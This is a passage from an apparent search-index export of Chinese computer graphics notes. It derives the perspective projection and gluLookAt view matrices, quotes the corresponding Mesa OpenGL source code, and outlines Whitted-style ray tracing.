<p>\u200b\u56e0\u6b64\u200b\u5728\u200b\u5b9e\u73b0\u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u8981\u200b\u5229\u7528\u200b\u8fd9\u6761\u200b\u4ece\u200b\u539f\u70b9\u200b\u51fa\u53d1\u200b\u5230\u200b near \u200b\u5e73\u9762\u200b\u7684\u200b\u4e00\u70b9\u200b\u7684\u200b\u5c04\u7ebf\u200b\uff1a\u200b\u7531\u4e8e\u200b\u8fd9\u200b\u6761\u200b\u5c04\u7ebf\u200b\u4e0a\u200b\u7684\u200b\u70b9\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u540c\u4e00\u4e2a\u200b\u70b9\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5728\u200b NDC \u200b\u4e2d\u200b\u4e5f\u200b\u5bf9\u5e94\u200b\u540c\u4e00\u4e2a\u200b \\((x', y')\\) \u200b\u5750\u6807\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5728\u200b\u8ba1\u7b97\u200b \\(x'\\) \u200b\u548c\u200b \\(y'\\) \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5148\u200b\u5229\u7528\u200b\u76f8\u4f3c\u200b\u4e09\u89d2\u5f62\u200b\u5173\u7cfb\u200b\uff0c\u200b\u628a\u200b\u70b9\u200b\u6620\u5c04\u200b\u5230\u200b near \u200b\u5e73\u9762\u200b\u4e0a\u200b\uff08near \u200b\u5e73\u9762\u200b\u7684\u200b Z \u200b\u5750\u6807\u200b\u662f\u200b \\(z=-n\\)\uff09\uff1a</p> \\[\\begin{align} \\frac{x'}{x} = \\frac{-n}{z} \\\\ \\frac{y'}{y} = \\frac{-n}{z} \\end{align}\\] <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u56db\u200b\u68f1\u53f0\u200b\u5230\u200b\u957f\u65b9\u4f53\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u91cc\u200b\u6d89\u53ca\u200b\u5230\u200b\u5bf9\u200b \\(z\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u5728\u200b\u77e9\u9635\u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u9488\u5bf9\u200b \\(z\\) \u200b\u7684\u200b\u9664\u6cd5\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u9700\u8981\u200b\u5229\u7528\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u81ea\u5e26\u200b\u7684\u200b\u9664\u6cd5\u200b\uff1a\\((x, y, z, w) \\to (x/w, y/w, z/w)\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u628a\u200b \\(z\\) \u200b\u7684\u200b\u503c\u200b\u632a\u5230\u200b \\(w\\) \u200b\u4e0a\u200b\uff0c\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u9664\u6cd5\u200b\u3002\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b\u77e9\u9635\u200b\uff1a</p> \\[ \\begin{pmatrix} n &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; n &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; A &amp; B \\\\ 0 &amp; 0 &amp; -1 &amp; 0 \\end{pmatrix} \\] <p>\u200b\u5176\u4e2d\u200b \\(A\\) \u200b\u548c\u200b \\(B\\) \u200b\u662f\u200b\u672a\u77e5\u6570\u200b\u3002\u200b\u9a8c\u8bc1\u200b\u4e00\u4e0b\u200b\u4e0a\u9762\u200b\u7684\u200b\u77e9\u9635\u200b\u662f\u5426\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u9664\u6cd5\u200b\uff1a</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u751f\u6210\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\uff1a</p> \\[ (x, y, z) \\to (x, y, z, 1) \\] <p>\u200b\u77e9\u9635\u200b\u53d8\u6362\u200b\u4ee5\u540e\u200b\uff1a</p> \\[\\begin{align} x' &amp;= nx \\\\ y' &amp;= ny \\\\ z' &amp;= Az + B \\\\ w' &amp;= -z \\end{align}\\] <p>\u200b\u518d\u200b\u4ece\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u53d8\u56de\u6765\u200b\uff0c\u200b\u5f97\u5230\u200b \\((-\\frac{nx}{z}, -\\frac{ny}{z}, -A-\\frac{B}{z})\\)\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0cx \u200b\u548c\u200b y \u200b\u90fd\u200b\u5f97\u5230\u200b\u4e86\u200b\u548c\u200b\u524d\u9762\u200b\u7528\u200b\u76f8\u4f3c\u200b\u4e09\u89d2\u5f62\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u4e00\u6837\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u4f46\u662f\u200b z \u200b\u7684\u200b\u503c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u53d8\u5316\u200b\u3002\u200b\u4f46\u662f\u200b\u6ca1\u6709\u200b\u5173\u7cfb\u200b\uff0c\u200b\u867d\u7136\u200b z \u200b\u7684\u200b\u503c\u53d8\u200b\u4e86\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b83\u200b\u4f9d\u7136\u200b\u662f\u200b\u4fdd\u5e8f\u200b\u7684\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u7ee7\u7eed\u200b\u4fdd\u8bc1\u200b\u5b83\u200b\u5728\u200b \\([-f, -n]\\) \u200b\u8303\u56f4\u200b\u5373\u53ef\u200b\uff1a</p> \\[\\begin{align} -n = -A-\\frac{B}{-n} \\\\ -f = -A-\\frac{B}{-f} \\end{align}\\] <p>\u200b\u6c42\u89e3\u200b\u53ef\u200b\u5f97\u200b \\(A=n+f, B=-nf\\)\uff0c\u200b\u56e0\u6b64\u200b\u524d\u9762\u200b\u7684\u200b\u77e9\u9635\u200b\u5c31\u662f\u200b\uff1a</p> \\[ \\begin{pmatrix} n &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; n &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; n+f &amp; -nf \\\\ 0 &amp; 0 &amp; -1 &amp; 0 \\end{pmatrix} \\] <p>\u200b\u5230\u200b\u8fd9\u200b\u4e00\u6b65\u200b\uff0c\u200b\u5c31\u200b\u5b8c\u6210\u200b\u4e86\u200b\u56db\u200b\u68f1\u53f0\u200b\u5230\u200b\u957f\u65b9\u4f53\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u63a5\u4e0b\u6765\u200b\u5c31\u662f\u200b\u6b63\u4ea4\u6295\u5f71\u200b\u4e86\u200b\uff0c\u200b\u628a\u200b\u957f\u65b9\u4f53\u200b\u6620\u5c04\u200b\u5230\u200b NDC \u200b\u4e0a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6700\u7ec8\u200b\u6574\u4f53\u200b\u7684\u200b\u6295\u5f71\u200b\u77e9\u9635\u200b\u5c31\u662f\u200b\u628a\u200b\u4e24\u4e2a\u200b\u77e9\u9635\u200b\u4e58\u8d77\u6765\u200b\uff08\u200b\u6b63\u4ea4\u6295\u5f71\u200b\u77e9\u9635\u200b\u5de6\u4e58\u200b\u4e0a\u9762\u200b\u7684\u200b\u77e9\u9635\u200b\uff09\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> \\[ \\begin{pmatrix} \\frac{2}{r-l} &amp; 0 &amp; 0 &amp; -\\frac{r+l}{r-l} \\\\ 0 &amp; \\frac{2}{t-b} &amp; 0 &amp; -\\frac{t+b}{t-b} \\\\ 0 &amp; 0 &amp; \\frac{-2}{f-n} &amp; -\\frac{f+n}{f-n} \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{pmatrix} \\cdot \\begin{pmatrix} n &amp; 0 &amp; 0 &amp; 0 \\\\ 0 &amp; n &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; n+f &amp; -nf \\\\ 0 &amp; 0 &amp; -1 &amp; 0 \\end{pmatrix} = \\begin{pmatrix} \\frac{2n}{r-l} &amp; 0 &amp; \\frac{r+l}{r-l} &amp; 0 \\\\ 0 &amp; \\frac{2n}{t-b} &amp; \\frac{t+b}{t-b} &amp; 0 \\\\ 0 &amp; 0 &amp; -\\frac{n+f}{f-n} &amp; \\frac{-2nf}{f-n} \\\\ 0 &amp; 0 &amp; -1 &amp; 0 \\end{pmatrix} \\] <p>\u200b\u8fd9\u200b\u5c31\u662f\u200b\u6700\u7ec8\u200b\u7684\u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u7684\u200b\u77e9\u9635\u200b\u3002\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5b83\u200b\u5047\u8bbe\u200b\u4e86\u200b\u8f93\u5165\u200b\u7684\u200b\u5750\u6807\u200b\u7684\u200b \\(w=1\\)\uff0c\u200b\u5982\u679c\u200b\u8f93\u5165\u200b\u7684\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u7684\u200b \\(w \\ne 1\\)\uff0c\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u5c31\u200b\u4f1a\u200b\u6709\u200b\u95ee\u9898\u200b\u3002\u200b\u5728\u200b OpenGL \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b gluPerspective() \u200b\u51fd\u6570\u200b\u5f97\u5230\u200b\u5b83\u200b\uff1a</p> <p> </p> \u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u77e9\u9635\u200b\uff08\u200b\u56fe\u6e90\u200b gluPerspective\uff09 <p>\u200b\u548c\u200b\u4e0a\u9762\u200b\u7684\u200b\u7ed3\u679c\u200b\u770b\u4f3c\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f46\u200b\u53ea\u8981\u200b\u8bbe\u5b9a\u200b \\(r=-l, t=-b, f=\\frac{n}{t}, aspect=\\frac{r}{t}\\)\uff0c\u200b\u4e24\u4e2a\u200b\u77e9\u9635\u200b\u5c31\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b gluPerspective \u200b\u91c7\u7528\u200b\u4e86\u200b\u900f\u89c6\u200b\u6295\u5f71\u200b\u7684\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\uff1a\u200b\u5de6\u53f3\u200b\u548c\u200b\u4e0a\u4e0b\u200b\u5bf9\u79f0\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b aspect \u200b\u662f\u200b\u957f\u5bbd\u200b\u6bd4\u200b\uff08x \u200b\u8f74\u200b\u9664\u4ee5\u200b y \u200b\u8f74\u200b\uff09\uff1b\\(f=cot(\\frac{fovy}{2})\\) \u200b\u662f\u200b\u8fd9\u4e48\u200b\u63a8\u5bfc\u200b\u7684\u200b\uff1ay \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u89c6\u91ce\u200b\u89d2\u5ea6\u200b\u4e0a\u4e0b\u200b\u5bf9\u79f0\u200b\uff0c\u200b\u89d2\u5ea6\u200b\u5927\u5c0f\u200b\u662f\u200b \\(fovy\\)\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u6c34\u5e73\u7ebf\u4e0a\u200b\u65b9\u200b\u7684\u200b\u89d2\u5ea6\u200b\u5c31\u662f\u200b \\(\\frac{fovy}{2}\\)\uff0c\u200b\u800c\u200b\u8fd9\u4e2a\u200b\u89d2\u5ea6\u200b\u5728\u200b\u4e09\u89d2\u5f62\u200b\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5bf9\u200b\u8fb9\u200b\u662f\u200b \\(t\\)\uff0c\u200b\u90bb\u8fb9\u200b\u662f\u200b \\(n\\)\uff0c\u200b\u6240\u4ee5\u200b \\(tan(\\frac{fovy}{2})=\\frac{t}{n}\\)\uff0c\u200b\u53cd\u8fc7\u6765\u200b\u5c31\u200b\u5f97\u5230\u200b \\(f=\\frac{n}{t}=cot(\\frac{fovy}{2})\\)\u3002</p> <p>\u200b\u66f4\u52a0\u200b\u901a\u7528\u200b\u7684\u200b OpenGL \u200b\u51fd\u6570\u200b\u662f\u200b glFrustum\uff0c\u200b\u5b83\u200b\u5f97\u5230\u200b\u7684\u200b\u77e9\u9635\u200b\u548c\u200b\u4e0a\u9762\u200b\u63a8\u5bfc\u200b\u51fa\u6765\u200b\u7684\u200b\u77e9\u9635\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u6ca1\u200b\u8003\u8651\u200b\u7279\u6b8a\u200b\u60c5\u51b5\u200b\u3002</p> <p>mesa \u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>// Source: https://github.com/Mesa3D/mesa/blob/957009978ef6d7121fc0d710d03bc20097d4d46b/src/mesa/math/m_matrix.c#L773-L797\nvoid\n_math_matrix_frustum( GLmatrix *mat,\n              GLfloat left, GLfloat right,\n              GLfloat bottom, GLfloat top,\n              GLfloat nearval, GLfloat farval )\n{\n   GLfloat x, y, a, b, c, d;\n   GLfloat m[16];\n\n   x = (2.0F*nearval) / (right-left);\n   y = (2.0F*nearval) / (top-bottom);\n   a = (right+left) / (right-left);\n   b = (top+bottom) / (top-bottom);\n   c = -(farval+nearval) / ( farval-nearval);\n   d = -(2.0F*farval*nearval) / (farval-nearval);  /* error? */\n\n#define M(row,col)  m[col*4+row]\n   M(0,0) = x;     M(0,1) = 0.0F;  M(0,2) = a;      M(0,3) = 0.0F;\n   M(1,0) = 0.0F;  M(1,1) = y;     M(1,2) = b;      M(1,3) = 0.0F;\n   M(2,0) = 0.0F;  M(2,1) = 0.0F;  M(2,2) = c;      M(2,3) = d;\n   M(3,0) = 0.0F;  M(3,1) = 0.0F;  M(3,2) = -1.0F;  M(3,3) = 0.0F;\n#undef M\n\n   matrix_multf( mat, m, MAT_FLAG_PERSPECTIVE );\n}\n</code></pre>"},{"location":"software/cg.html#view","title":"View \u200b\u77e9\u9635","text":"<p>OpenGL \u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u8fc7\u200b Model \u200b\u548c\u200b View \u200b\u77e9\u9635\u200b\u6620\u5c04\u200b\u540e\u200b\u5f97\u5230\u200b Eye Coordinates\uff0c\u200b\u76f8\u673a\u200b\u4f4d\u4e8e\u200b (0, 0, 0)\uff0c\u200b\u4e14\u200b\u770b\u200b\u5411\u200b -Z \u200b\u8f74\u200b\u7684\u200b\u65b9\u5411\u200b\u3002\u200b\u8ba1\u7b97\u200b\u76f8\u673a\u200b View \u200b\u77e9\u9635\u200b\u7684\u200b OpenGL \u200b\u51fd\u6570\u200b\u662f\u200b gluLookAt\u3002</p> <p>\u200b\u5728\u200b\u6620\u5c04\u200b\u4e4b\u524d\u200b\uff0c\u200b\u76f8\u673a\u200b\u4f4d\u4e8e\u200b\u4e16\u754c\u5750\u6807\u200b\u7684\u200b (eyeX, eyeY, eyeZ)\uff0c\u200b\u89c6\u7ebf\u200b\u770b\u200b\u5411\u200b (centerX, centerY, centerZ) \u200b\u70b9\u200b\uff08\u200b\u89c6\u91ce\u200b\u6b63\u524d\u65b9\u200b\uff09\uff0c\u200b\u4ee5\u53ca\u200b\u89c6\u91ce\u200b\u91cc\u200b\u5411\u4e0a\u200b\u7684\u200b\u65b9\u5411\u200b\u5728\u200b 3D \u200b\u91cc\u200b\u7684\u200b\u5411\u91cf\u200b (upX, upY, upZ)\uff08\u200b\u89c6\u91ce\u200b\u7684\u200b\u4e0a\u65b9\u200b\uff0cy \u200b\u8f74\u200b\uff09\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u76f8\u673a\u200b\u6b63\u5bf9\u200b\u7684\u200b\u5411\u91cf\u200b F=(centerX-eyeX, centerY-eyeY, centerZ-eyeZ)\uff0c\u200b\u8fd9\u4e2a\u200b\u65b9\u5411\u200b\u5728\u200b\u6620\u5c04\u200b\u540e\u200b\u7684\u200b\u5750\u6807\u7cfb\u200b\u4e2d\u200b\u5c31\u662f\u200b -Z \u200b\u8f74\u200b\u3002\u200b\u4ee4\u200b UP=(upX, upY, upZ)\uff0cUP \u200b\u6700\u7ec8\u200b\u5728\u200b\u89c6\u91ce\u200b\u91cc\u200b\u770b\u5230\u200b\u7684\u200b\u662f\u200b\u6cbf\u200b y \u200b\u8f74\u200b\u5411\u4e0a\u200b\uff0c\u200b\u4f46\u662f\u200b\u6620\u5c04\u200b\u4ee5\u540e\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u200b z \u200b\u7684\u200b\u5206\u91cf\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b F \u200b\u548c\u200b UP \u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u5782\u76f4\u200b\uff0c\u200b\u540e\u9762\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u3002</p> <p> </p> \u200b\u76f8\u673a\u200b\u7684\u200b eye\uff0cup \u200b\u548c\u200b center \u200b\u793a\u610f\u56fe\u200b\uff0c\u200b\u5176\u4e2d\u200b up \u200b\u5728\u200b Y-Z \u200b\u5e73\u9762\u200b\u5185\u200b <p> </p> center \u200b\u548c\u200b up \u200b\u5bf9\u5e94\u200b\u5c4f\u5e55\u200b\u7684\u200b\u4f4d\u7f6e\u200b <p>\u200b\u5bf9\u200b \\(F\\) \u200b\u8fdb\u884c\u200b\u6807\u51c6\u5316\u200b\uff0c\u200b\u5f97\u5230\u200b \\(f\\)\uff1b\u200b\u5bf9\u200b UP \u200b\u8fdb\u884c\u200b\u6807\u51c6\u5316\u200b\uff0c\u200b\u5f97\u5230\u200b \\(u\\)\uff1b\u200b\u7531\u4e8e\u200b \\(u\\) \u200b\u548c\u200b \\(f\\) \u200b\u786e\u5b9a\u200b\u4e86\u200b Y-Z \u200b\u5e73\u9762\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6c42\u200b X \u200b\u65b9\u5411\u200b\u7684\u200b\u5411\u91cf\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8ba1\u7b97\u200b\u53c9\u79ef\u200b\u5373\u53ef\u200b\uff1a\\(s = f \\times u\\)\uff0c\u200b\u7531\u4e8e\u200b \\(f\\) \u200b\u6307\u5411\u200b -Z\uff0c\\(u\\) \u200b\u5728\u200b Y-Z \u200b\u5e73\u9762\u200b\u4e2d\u200b Y \u200b\u4e3a\u200b\u6b63\u200b\u7684\u200b\u534a\u200b\u5e73\u9762\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f97\u5230\u200b\u7684\u200b s \u200b\u6307\u5411\u200b\u7684\u200b\u662f\u200b\u5c4f\u5e55\u200b\u7684\u200b\u53f3\u4fa7\u200b\uff0c\u200b\u4e0d\u59a8\u200b\u89c4\u5b9a\u200b\u53f3\u4fa7\u200b\u662f\u200b X \u200b\u6b63\u200b\u534a\u8f74\u200b\uff08\u200b\u53f3\u624b\u200b\u7cfb\u200b\uff09\u3002\u200b\u6b64\u65f6\u200b\u518d\u53c9\u79ef\u200b\uff0c\u200b\u5f97\u5230\u200b Y \u200b\u8f74\u200b\u7684\u200b\u65b9\u5411\u200b\uff1a\\(y = s \\times f\\)\u3002</p> <p> </p> s \u200b\u548c\u200b y \u200b\u5411\u91cf\u200b\u7684\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u56fe\u4e2d\u200b\u6ca1\u6709\u200b\u4f53\u73b0\u200b\u5411\u91cf\u200b\u7684\u200b\u957f\u5ea6\u200b <p>\u200b\u6b64\u65f6\u200b\u4e09\u4e2a\u200b\u8f74\u4e0a\u200b\u7684\u200b\u5411\u91cf\u200b\u90fd\u200b\u6709\u200b\u4e86\u200b\uff1aX \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\u662f\u200b s\uff0cY \u200b\u8f74\u6b63\u200b\u65b9\u5411\u200b\u662f\u200b y\uff0cZ \u200b\u8f74\u8d1f\u200b\u65b9\u5411\u200b\u662f\u200b f\u3002\u200b\u7531\u4e8e\u200b\u53c9\u79ef\u200b\u4ee5\u524d\u200b\u5df2\u7ecf\u200b\u505a\u200b\u4e86\u200b\u6807\u51c6\u5316\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u5411\u91cf\u200b\u90fd\u200b\u662f\u200b\u5355\u4f4d\u5411\u91cf\u200b\u3002\u200b\u90a3\u4e48\u200b\u5750\u6807\u7cfb\u200b\u7684\u200b\u53d8\u6362\u200b\u77e9\u9635\u200b\u5e94\u8be5\u200b\u5b9e\u73b0\u200b\u4e0b\u9762\u200b\u7684\u200b\u6620\u5c04\u200b\uff1a</p> <ul> <li>\\(Ms = M(s_x, s_y, s_z)^T = (1, 0, 0)^T\\)</li> <li>\\(My = M(y_x, y_y, y_z)^T = (0, 1, 0)^T\\)</li> <li>\\(Mz = M(f_x, f_y, f_z)^T = (0, 0, -1)^T\\)</li> </ul> <p>\u200b\u4e8e\u662f\u200b\uff1a</p> \\[ M=\\begin{pmatrix} s_x &amp; s_y &amp; s_z \\\\ y_x &amp; y_y &amp; y_z \\\\ -f_x &amp; -f_y &amp; -f_z \\\\ \\end{pmatrix} \\] <p>\u200b\u8fd9\u91cc\u200b\u4f9d\u8d56\u200b\u4e86\u200b\u4e09\u4e2a\u200b\u5411\u91cf\u200b \\(s\\) \\(y\\) \\(-f\\) \u200b\u90fd\u200b\u662f\u200b\u5355\u4f4d\u5411\u91cf\u200b\uff0c\u200b\u4e14\u200b\u4e92\u76f8\u200b\u6b63\u4ea4\u200b\u7684\u200b\u6027\u8d28\u200b\u3002</p> <p>\u200b\u628a\u200b\u9f50\u6b21\u200b\u5750\u6807\u200b\u7684\u200b w \u200b\u7ef4\u5ea6\u200b\u52a0\u56de\u6765\u200b\uff0c\u200b\u5c31\u662f\u200b\uff1a</p> \\[ M=\\begin{pmatrix} s_x &amp; s_y &amp; s_z &amp; 0 \\\\ y_x &amp; y_y &amp; y_z &amp; 0 \\\\ -f_x &amp; -f_y &amp; -f_z &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{pmatrix} \\] <p>\u200b\u4ee5\u4e0a\u200b\u77e9\u9635\u200b\u89e3\u51b3\u200b\u4e86\u200b\u76f8\u673a\u200b\u5750\u6807\u7cfb\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5269\u4e0b\u200b\u5c31\u662f\u200b\u628a\u200b\u5750\u6807\u200b (eyeX, eyeY, eyeZ) \u200b\u632a\u5230\u200b (0, 0, 0) \u200b\u4e0a\u200b\uff1a</p> \\[ M=\\begin{pmatrix} s_x &amp; s_y &amp; s_z &amp; 0 \\\\ y_x &amp; y_y &amp; y_z &amp; 0 \\\\ -f_x &amp; -f_y &amp; -f_z &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{pmatrix} \\begin{pmatrix} 1 &amp; 0 &amp; 0 &amp; -\\mathrm{eyeX} \\\\ 0 &amp; 1 &amp; 0 &amp; -\\mathrm{eyeY} \\\\ 0 &amp; 0 &amp; 1 &amp; -\\mathrm{eyeZ} \\\\ 0 &amp; 0 &amp; 0 &amp; 1 \\end{pmatrix} \\] <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u5b8c\u6574\u200b\u7684\u200b View \u200b\u77e9\u9635\u200b\u3002</p> <p>mesa \u200b\u4e2d\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>// Source: https://gitlab.freedesktop.org/mesa/mesa/-/blob/c6a80dc32ef17bc972d4137ce7444ebed4d28ebb/src/glu/sgi/libutil/project.c#L108\n// Comments added\nvoid gluLookAt(GLdouble eyex, GLdouble eyey, GLdouble eyez, GLdouble centerx,\n    GLdouble centery, GLdouble centerz, GLdouble upx, GLdouble upy,\n    GLdouble upz)\n{\n    float forward[3], side[3], up[3];\n    GLfloat m[4][4];\n\n    /* Compute f = center - eye */\n    forward[0] = centerx - eyex;\n    forward[1] = centery - eyey;\n    forward[2] = centerz - eyez;\n\n    up[0] = upx;\n    up[1] = upy;\n    up[2] = upz;\n\n    normalize(forward);\n\n    /* Side = forward x up */\n    cross(forward, up, side);\n    normalize(side);\n\n    /* Recompute up as: up = side x forward */\n    cross(side, forward, up);\n\n    __gluMakeIdentityf(&amp;m[0][0]);\n\n    /* s_x s_y s_z */\n    m[0][0] = side[0];\n    m[1][0] = side[1];\n    m[2][0] = side[2];\n\n    /* y_x y_y y_z */\n    m[0][1] = up[0];\n    m[1][1] = up[1];\n    m[2][1] = up[2];\n\n    /* -f_x -f_y -f_z */\n    m[0][2] = -forward[0];\n    m[1][2] = -forward[1];\n    m[2][2] = -forward[2];\n\n    /* Update view matrix */\n    glMultMatrixf(&amp;m[0][0]);\n    glTranslated(-eyex, -eyey, -eyez);\n}\n</code></pre>"},{"location":"software/cg.html#_6","title":"\u5149\u7ebf\u200b\u8ffd\u8e2a","text":"<p>Whitted-style ray-tracing \u200b\u662f\u200b\u4e00\u79cd\u200b\u5178\u578b\u200b\u7684\u200b\u5149\u7ebf\u200b\u8ffd\u8e2a\u200b\u7b97\u6cd5\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5b9e\u73b0\u200b\u601d\u8def\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u5bf9\u4e8e\u200b\u8981\u200b\u7ed8\u5236\u200b\u5728\u200b\u5c4f\u5e55\u200b\u4e0a\u200b\u7684\u200b\u70b9\u200b\uff0c\u200b\u8ba1\u7b97\u200b\u5b83\u200b\u5728\u200b 3 \u200b\u7ef4\u7a7a\u95f4\u200b\u4e2d\u200b\u7684\u200b\u5bf9\u5e94\u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4e0e\u200b\u76f8\u673a\u200b\u7684\u200b\u539f\u70b9\u200b\u6784\u6210\u200b\u4e00\u4e2a\u200b\u5c04\u7ebf\u200b</li> <li>\u200b\u8ba1\u7b97\u200b\u5c04\u7ebf\u200b\u4e0e\u200b\u573a\u666f\u200b\u4e2d\u200b\u8868\u9762\u200b\u7684\u200b\u7b2c\u4e00\u4e2a\u200b\u4ea4\u70b9\u200b\uff0c\u200b\u6839\u636e\u200b\u8868\u9762\u200b\u7684\u200b\u7c7b\u578b\u200b\u8fdb\u884c\u200b\u4e0d\u540c\u200b\u7684\u200b\u5904\u7406\u200b\uff1a<ol> <li>\u200b\u6f2b\u53cd\u5c04\u200b\uff08Diffuse\uff09\uff1a\u200b\u627e\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u5149\u6e90\u200b\uff0c\u200b\u627e\u51fa\u200b\u90a3\u4e9b\u200b\u53ef\u4ee5\u200b\u7167\u4eae\u200b\u4ea4\u70b9\u200b\u7684\u200b\u5149\u6e90\u200b\uff08\u200b\u5149\u6e90\u200b\u5230\u200b\u4ea4\u70b9\u200b\u4e4b\u95f4\u200b\u6ca1\u6709\u200b\u906e\u6321\u200b\uff09\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5149\u6e90\u200b\u5bf9\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u7684\u200b\u8d21\u732e\u200b</li> <li>\u200b\u955c\u9762\u53cd\u5c04\u200b\uff08Specular\uff09\uff1a\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u53cd\u5c04\u5149\u200b\uff0c\u200b\u628a\u200b\u53cd\u5c04\u5149\u200b\u5f53\u6210\u200b\u89c6\u7ebf\u200b\uff0c\u200b\u7ee7\u7eed\u200b\u9012\u5f52\u200b</li> <li>\u200b\u955c\u9762\u53cd\u5c04\u200b + \u200b\u6298\u5c04\u200b\uff08Refraction\uff09\uff1a\u200b\u5206\u522b\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u53cd\u5c04\u5149\u200b\u548c\u200b\u6298\u5c04\u5149\u200b\uff0c\u200b\u5206\u522b\u200b\u9012\u5f52\u200b\u7136\u540e\u200b\u6309\u7167\u200b Fresnel \u200b\u65b9\u7a0b\u200b\u52a0\u6743\u200b\u6c42\u548c\u200b</li> </ol> </li> </ol> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u5149\u7ebf\u200b\u5728\u200b\u9012\u5f52\u200b\u7ec8\u6b62\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8981\u4e48\u200b\u662f\u200b\u5728\u200b\u6f2b\u53cd\u5c04\u200b\u8868\u9762\u200b\u4e0a\u200b\uff0c\u200b\u8981\u4e48\u200b\u5c31\u662f\u200b\u6ca1\u6709\u200b\u627e\u5230\u200b\u76f8\u4ea4\u200b\u7684\u200b\u8868\u9762\u200b\u3002</p>"},{"location":"software/cg.html#_7","title":"\u8f90\u5c04\u200b\u5ea6\u91cf\u200b\u5b66","text":"<p>\u200b\u53c2\u8003\u200b \u200b\u8def\u5f84\u200b\u8ffd\u8e2a\u200b\uff08Path Tracing\uff09\u200b\u4e0e\u200b\u6e32\u67d3\u200b\u65b9\u7a0b\u200b (Render Equation) \u200b\u548c\u200b GAMES101 Lecture 